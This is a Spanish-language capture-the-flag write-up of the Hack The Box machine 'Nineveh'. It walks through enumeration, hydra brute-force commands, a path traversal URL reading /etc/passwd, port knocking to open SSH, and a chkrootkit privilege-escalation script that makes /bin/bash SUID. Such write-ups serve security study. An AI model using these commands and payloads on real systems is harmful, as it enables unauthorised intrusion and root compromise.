---
title: Nineveh - WriteUp
date: 'Fri, 13 Jun 2025 00:00:00 GMT'
categories:
  - WriteUps
  - HTB
  - Linux
tags:
  - ctf
  - nmap
  - htb
  - hydra
  - dirb
  - reverse-shell
  - linpeas
  - exploit
  - pspy
  - apache
image: /assets/img/cabeceras/2025-06-13-NINEVEH-WRITEUP.png
---

{% include machine-info.html
  machine="Nineveh"
  os="Linux"
  difficulty="Medium"
  platform="HTB"
%}



#### ENUMERACIÓN

NMAP
```bash
# Nmap 7.94SVN scan initiated Mon Feb  5 17:50:58 2024 as: nmap -sCV -p 80,443 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstra
p.xsl -oN targeted -oX targetedXML 10.129.229.157
Nmap scan report for 10.129.229.157
Host is up (0.043s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb  5 17:51:17 2024 -- 1 IP address (1 host up) scanned in 18.67 seconds
```

HTTPS

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205175555.png)

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205175703.png)

Nos bajamos la imagen y le echamos un vistazo:

```bash
$ wget https://nineveh.htb/ninevehForAll.png --no-check-certificate

--2024-02-05 17:58:47--  https://nineveh.htb/ninevehForAll.png
Resolving nineveh.htb (nineveh.htb)... 10.129.229.157
Connecting to nineveh.htb (nineveh.htb)|10.129.229.157|:443... connected.
WARNING: The certificate of ‘nineveh.htb’ is not trusted.
WARNING: The certificate of ‘nineveh.htb’ doesnt have a known issuer.
WARNING: The certificate of ‘nineveh.htb’ has expired.
The certificate has expired
HTTP request sent, awaiting response... 200 OK
Length: 560852 (548K) [image/png]
Saving to: ninevehForAll.png

ninevehForAll.png                             100%[=================================================================================================>] 547.71K  2.01MB/s    in 0.3s    

2024-02-05 17:58:47 (2.01 MB/s) - ‘ninevehForAll.png’ saved [560852/560852]
```

Examinamos la imagen a detalle:

```bash
$ exiftool ninevehForAll.png

ExifTool Version Number         : 12.70
File Name                       : ninevehForAll.png
Directory                       : .
File Size                       : 561 kB
File Modification Date/Time     : 2017:07:03 01:50:02+02:00
File Access Date/Time           : 2024:02:05 17:58:47+01:00
File Inode Change Date/Time     : 2024:02:05 17:58:47+01:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1336
Image Height                    : 508
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8
Software                        : Shutter
Image Size                      : 1336x508
Megapixels                      : 0.679
```

FUZZING HTTP:

```bash
$ gobuster dir -u http://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -k --no-error --add-slash

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nineveh.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/department/          (Status: 200) [Size: 68]
/icons/               (Status: 403) [Size: 292]
/server-status/       (Status: 403) [Size: 300]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205190614.png)

Es vulnerable a la enumeración de usuarios. Comprobamos que _admin_ existe por lo que realizaremos un ataque de diccionario con _hydra_:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -I 10.129.229.157 http-post-form "//department/login.php:username=admin&password=^PASS^:Invalid Password"
```

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205191552.png)

```http
admin:1q2w3e4r5t
```

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205191813.png)

Intentamos hacer un path traversal.

```http
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../../etc/passwd
```

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205193037.png)

Probamos las principales rutas hasta que hacemos un descubrimiento:

```bash
/etc/passwd
/etc/os-release
/etc/knockd.conf
/proc/net/tcp
/proc/net/fib_trie
/proc/sched_debug
```

En el archivo /proc/sched_debug vemos que tiene el servicio _knockd_. Eso significa que tiene un puerto que se activa con _knocking_ en la secuencia de puertos correcta.

Para ello revisamos el archivo /etc/knockd.conf que contiene lo siguiente:

```bash
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

Una vez sabemos la secuencia nos disponemos a abrir el puerto 22 SSH:

```bash
$ knock 10.129.229.157 571:tcp 290:tcp 911:tcp
...
$ ssh amrois@10.129.229.157
```

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205195032.png)

Pero necesitamos un archivo de clave pública para poder entrar.

FUZZING HTTPS:

```bash
$ gobuster dir -u https://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -k --no-error --add-slash -x php,txt,html,png

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://nineveh.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,php,txt,html
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html/               (Status: 403) [Size: 293]
/.php/                (Status: 403) [Size: 292]
/icons/               (Status: 403) [Size: 293]
/db/                  (Status: 200) [Size: 11430]
/.php/                (Status: 403) [Size: 292]
/.html/               (Status: 403) [Size: 293]
/server-status/       (Status: 403) [Size: 301]
/secure_notes/        (Status: 200) [Size: 71]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

Vamos a ver qué hay en la ruta /db/:

```
Warning: rand() expects parameter 2 to be integer, float given in /var/www/ssl/db/index.php on line 114
```

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205181225.png)

Podemos introducir un password. Si no lo encontramos intentaremos romperlo con _hydra_

```bash
$ hydra -l "" -P /usr/share/wordlists/rockyou.txt -I nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -s 443
```

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205183334.png)

Probamos la contraseña _password123_

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205183447.png)

Podemos intentar de crear un PHP o archivo PHP malicioso que nos envíe una Reverse Shell pero antes vamos a ver lo que hay en la otra ruta encontrado con el fuzzing... 

Vamos a ver qué hay en la ruta /secure_notes/

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205183136.png)

Nos descargamos la imagen y al pasarle un _strings_ vemos esto...

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205200652.png)

Tenemos una clave privada!

Lo copiamos, lo metemos en un archivo que llamaremos _id_rsa_, le damos permisos 600 y probamos otra vez de conectarnos por SSH de nuevo.

```bash
$ ssh -i id_rsa amrois@10.129.229.157
```

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205201016.png)

Y pa dentro!!!

Nos subimos linpeas y pspy como siempre y empezamos la enumeración.

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205202652.png)

Con pspy vemos que se ejecuta todo el rato

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205204637.png)

Vamos a ver la vulnerabilidad

https://www.exploit-db.com/exploits/33899

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205204743.png)

El exploit consiste en crear un archivo con permisos de ejecución y llamarlo _update_, lo que pongamos ahí se ejecutará como root.

Creamos el archivo update con el siguiente contenido.

```bash
#!/bin/bash
chmod u+s /bin/bash
```

Esperamos...

![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205204524.png)

PWNED!!!!
---

**Última actualización**: 2025-06-13<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
